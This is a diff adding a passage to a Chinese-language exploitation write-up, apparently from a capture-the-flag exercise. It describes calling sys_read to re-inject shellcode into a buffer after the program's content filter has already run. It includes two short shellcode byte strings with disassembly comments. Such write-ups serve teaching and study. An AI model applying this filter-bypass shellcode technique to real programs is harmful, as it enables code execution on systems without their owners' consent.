@@ -357,6 +357,21 @@ syscall number 是 `rax = 0x00` 、參數分別是：\
 
 藉由呼叫 `sys_read` 來重新注入 `buf[]` 的記憶體空間，因為此時程式已經檢查完 `buf[]` 的內容，所以重新注入的 shellcode 將不會再受到限制
 
+下面是呼叫 `sys_read` 的ㄧ小段 shellcode：
+```bash
+shellcode_sys_read_part1="\x0c\x87\x63\xd0\x89\xdb"
+: << Instruction
+0c 87                   or     al, 0x87
+63 d0                   movsxd edx, eax  # assign buffer size, by the way this line can be executed, but it can't be assembled by nasm.
+89 db                   mov    ebx, ebx  # do nothing, regarded as 2 bytes nop
+Instruction
 
+shellcode_sys_read_part2="\x0c\x87\x63\xc3\x0f\x05"
+: << Instruction
+0c 87                   or     al, 0x87
+63 c3                   movsxd eax, ebx  # rax clear, by the way this line can be executed, but it can't be assembled by nasm.
+0f 05                   syscall
+Instruction
+```
 
 
